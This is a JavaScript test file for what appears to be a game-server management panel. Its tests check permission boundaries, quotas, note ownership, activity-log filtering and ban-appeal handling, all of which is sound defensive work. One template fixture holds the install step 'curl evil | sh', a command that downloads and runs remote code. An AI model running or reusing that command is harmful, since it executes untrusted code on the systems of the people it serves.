'use strict';

const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');

process.env.GP_DATA_DIR = fs.mkdtempSync(path.join(os.tmpdir(), 'gp-afa-data-'));
const { makeApp, load } = require('./support/routes');
const quotas = require('../../server/features/quotas');
const bans = require('../../server/features/bans');
const history = require('../../server/servers/history');
const { ServerManager } = require('../../server/servers/manager');

const PW = 'correct horse 42';
/** A panel with one server and one sub-user holding the given capabilities on it. */
function panel(permissions, extra = {}) {
  const server = { id: 's1', name: 'Survival', memory: 2048, cpuLimit: 100, ownerId: null };
  const app = makeApp({ manager: { servers: [server], require: (id) => (id === 's1' ? server : (() => { throw new Error('no server'); })()), template: () => ({ modpacks: true }), isActive: () => false, ...extra } });
  const admin = app.auth.createUser({ username: 'boss', password: PW, role: 'admin' });
  app.auth.createUser({ username: 'helper', password: PW, servers: ['s1'], permissions });
  const user = app.auth.users.find((u) => u.username === 'helper');
  return { app, server, user, admin: app.auth.users.find((u) => u.id === admin.id) };
}

test('reinstalling through the crash doctor or a modpack needs power and file access, not just settings or mods', async () => {
  const fixed = [];
  const reinstalled = [];
  const { app, user } = panel(['settings', 'mods'], { applyFix: async (id, body) => (fixed.push(body.action), { ok: true }), install: async () => reinstalled.push(1), update() {} });
  const api = load('servers', app);
  await assert.rejects(api.call('POST', '/api/servers/s1/diagnose/fix', { user, body: { action: 'reinstall' } }), /not allowed/);
  assert.deepStrictEqual(fixed, []);
  const mods = load('mods', app);
  await assert.rejects(mods.call('POST', '/api/servers/s1/modpacks/install', { user, body: { project: 'pack', source: 'modrinth' } }), /not allowed/);
  assert.deepStrictEqual(reinstalled, []);

  // With what a reinstall really needs, it goes through; other fixes still need only settings.
  user.permissions = ['settings', 'mods', 'power', 'files.write'];
  await api.call('POST', '/api/servers/s1/diagnose/fix', { user, body: { action: 'reinstall' } });
  assert.deepStrictEqual(fixed, ['reinstall']);
  user.permissions = ['settings'];
  await api.call('POST', '/api/servers/s1/diagnose/fix', { user, body: { action: 'java', java: 17 } });
  assert.deepStrictEqual(fixed, ['reinstall', 'java']);
});

test('a panel-wide player note is changed by an administrator or its author, not by any other sub-user', () => {
  const store = { state: { users: [] }, save() {} };
  const set = (name, body, actor) => history.setPlayerNote.call({ store }, name, body, actor);
  const alice = { username: 'alice', role: 'user' };
  const bob = { username: 'bob', role: 'user' };
  const admin = { username: 'boss', role: 'admin' };
  assert.strictEqual(set('Steve', { note: 'watch him', watch: true }, alice).by, 'alice');
  assert.throws(() => set('steve', { note: 'all good', watch: false }, bob), /written by someone else/);
  assert.throws(() => set('steve', { note: '', watch: false }, bob), /written by someone else/, 'clearing it is changing it');
  assert.strictEqual(store.state.playerNotes.steve.note, 'watch him');
  assert.strictEqual(set('Steve', { note: 'edited by the author' }, alice).note, 'edited by the author');
  assert.strictEqual(set('Steve', { note: 'edited by an admin' }, admin).note, 'edited by an admin');
  assert.strictEqual(set('Steve', { note: '' }, admin), null);
});

test('a custom template, with its install script, goes to administrators only; the catalogue entry has no steps', async () => {
  const custom = { id: 'mine', name: 'Mine', category: 'Custom', custom: true, install: [{ type: 'shell', run: 'curl evil | sh' }], windows: { startCommand: 'a.exe', install: [{ type: 'powershell', run: 'x' }] }, startCommand: './run' };
  const { app, user, admin } = panel(['templates']);
  app.templates = { list: () => [custom], require: () => custom, categories: () => [] };
  app.manager.pickPlatform = () => 'linux';
  const api = load('templates', app);
  const view = (await api.call('GET', '/api/templates/mine', { user })).template;
  assert.strictEqual(view.install, undefined);
  assert.strictEqual(view.windows.install, undefined);
  assert.strictEqual(view.windows.startCommand, 'a.exe');
  const listed = (await api.call('GET', '/api/templates', { user })).templates[0];
  assert.strictEqual(listed.install, undefined, 'the list does not carry it either');
  assert.strictEqual((await api.call('GET', '/api/templates/mine', { user: admin })).template.install.length, 1);
  user.permissions = [];
  await assert.rejects(api.call('GET', '/api/templates/mine', { user }), /not allowed/);
});

test('the schedule list needs the schedules capability on that server', async () => {
  const { app, user } = panel(['power', 'console']);
  app.scheduler = { list: () => [{ id: 'x', action: 'command', command: 'op secret' }] };
  const api = load('servers', app);
  await assert.rejects(api.call('GET', '/api/servers/s1/schedules', { user }), /not allowed/);
  user.permissions = ['schedules'];
  assert.strictEqual((await api.call('GET', '/api/servers/s1/schedules', { user })).schedules.length, 1);
});

test('the activity log shows a sub-user only events of servers they can reach', async () => {
  const { app, user, admin } = panel(['activity']);
  app.store.state.events = [
    { id: 1, type: 'node.added', message: 'boss added node Home (http://10.0.0.5:8420)', at: 3 },
    { id: 2, type: 'bridge.connected', message: 'alice connected', at: 3 },
    { id: 3, type: 'ban.appeal', message: 'Steve appealed', at: 2 },
    { id: 4, type: 'server.started', message: 'Survival started', serverId: 's1', at: 2 },
    { id: 5, type: 'server.started', message: 'Other started', serverId: 's2', at: 1 },
  ];
  app.hostMetrics = {};
  app.notifier = {};
  app.bridge = {};
  const api = load('system', app);
  const seen = (await api.call('GET', '/api/events', { user })).events.map((e) => e.id);
  assert.deepStrictEqual(seen, [4]);
  assert.strictEqual((await api.call('GET', '/api/events', { user: admin })).events.length, 5);
});

test('deleting a server takes it out of accounts, their per-server permissions and the status page', () => {
  const store = {
    state: {
      users: [
        { id: 'u1', servers: ['gone', 'kept'], serverPerms: { gone: ['power'], kept: ['console'] } },
        { id: 'u2', servers: ['gone'] },
      ],
      settings: { statusPage: { servers: ['gone', 'kept'], blurbs: { gone: 'old', kept: 'new' } } },
    },
  };
  ServerManager.prototype.forgetServerEverywhere.call({ store }, 'gone');
  assert.deepStrictEqual(store.state.users[0].servers, ['kept']);
  assert.deepStrictEqual(store.state.users[0].serverPerms, { kept: ['console'] });
  assert.deepStrictEqual(store.state.users[1].servers, []);
  assert.deepStrictEqual(store.state.settings.statusPage, { servers: ['kept'], blurbs: { kept: 'new' } });
});

test('someone who did not create a server cannot raise its memory or loosen its CPU cap', () => {
  const sub = { id: 'u2', role: 'user' };
  const owner = { id: 'u1', role: 'user', quota: { memoryMb: 0 } };
  const admin = { id: 'a', role: 'admin' };
  const server = { id: 's', ownerId: 'u1', memory: 2048, cpuLimit: 100 };
  const manager = { servers: [server], rt: () => ({}) };
  assert.throws(() => quotas.checkMemory(manager, sub, server, 8192), /Only an administrator/);
  assert.doesNotThrow(() => quotas.checkMemory(manager, sub, server, 1024), 'lowering is fine');
  assert.doesNotThrow(() => quotas.checkMemory(manager, sub, server, 2048), 'a form that sends the value back still saves');
  assert.doesNotThrow(() => quotas.checkMemory(manager, owner, server, 8192), 'the owner is held to the quota instead');
  assert.doesNotThrow(() => quotas.checkMemory(manager, admin, server, 65536));
  assert.throws(() => quotas.checkCpu(sub, server, 0), /capped at 100%/);
  assert.throws(() => quotas.checkCpu(sub, server, 400), /capped at 100%/);
  assert.doesNotThrow(() => quotas.checkCpu(sub, server, 50));
  assert.doesNotThrow(() => quotas.checkCpu(sub, server, 100));
  assert.doesNotThrow(() => quotas.checkCpu(owner, server, 0));
  assert.doesNotThrow(() => quotas.checkCpu(sub, { ...server, cpuLimit: 0 }, 0), 'nothing to loosen when there is no cap');
});

test('the PATCH route applies those limits to a settings sub-user', async () => {
  const { app, user } = panel(['settings']);
  app.manager.update = (id, body) => ({ id, ...body });
  app.manager.publicServer = (s) => s;
  const api = load('servers', app);
  await assert.rejects(api.call('PATCH', '/api/servers/s1', { user, body: { memory: 16384 } }), /Only an administrator/);
  await assert.rejects(api.call('PATCH', '/api/servers/s1', { user, body: { cpuLimit: 0 } }), /capped at 100%/);
  assert.ok(await api.call('PATCH', '/api/servers/s1', { user, body: { memory: 1024, cpuLimit: 50 } }));
});

test('a ban appeal gets the same answer for a banned name, an unbanned one, and a ban with appeals waiting', async () => {
  const store = { state: { settings: {} }, save() {}, addEvent() {} };
  const manager = { servers: [], template: () => null, rt: () => ({}), isActive: () => false, logActivity() {}, pushConsole() {} };
  await bans.ban(manager, store, { name: 'Steve' }, 'admin');
  bans.updateAppealSettings(store, { enabled: true });
  const message = 'It was my brother on my account, sorry about that.';
  const shape = (r) => Object.keys(r).join();
  const unknown = bans.submitAppeal(store, { name: 'Nobody', message });
  const first = bans.submitAppeal(store, { name: 'Steve', message });
  assert.strictEqual(shape(unknown), shape(first));
  assert.match(unknown.code, /^[A-Z0-9]{8}$/);
  // Both read "open" afterwards, and only the real one reaches the administrators.
  assert.strictEqual(bans.appealStatus(store, unknown.code).status, 'open');
  assert.strictEqual(bans.appealStatus(store, first.code).status, 'open');
  assert.strictEqual(bans.view(manager, store).appeals.length, 1);

  // One person sending a junk appeal does not use up the ban's only chance.
  const junk = bans.submitAppeal(store, { name: 'Steve', message: 'x'.repeat(30) });
  const real = bans.submitAppeal(store, { name: 'Steve', message });
  assert.strictEqual(bans.view(manager, store).appeals.length, 3);
  // ...but a flood does not grow the list without end: past three, the rest are decoys.
  const extra = bans.submitAppeal(store, { name: 'Steve', message });
  assert.strictEqual(bans.view(manager, store).appeals.length, 3);
  assert.strictEqual(bans.appealStatus(store, extra.code).status, 'open');

  // Accepting one settles the others for the same ban.
  const view = bans.view(manager, store);
  await bans.decide(manager, store, view.appeals[0].id, { decision: 'accept', reply: 'Welcome back' }, 'admin');
  for (const c of [first, junk, real]) assert.strictEqual(bans.appealStatus(store, c.code).status, 'accepted');
});
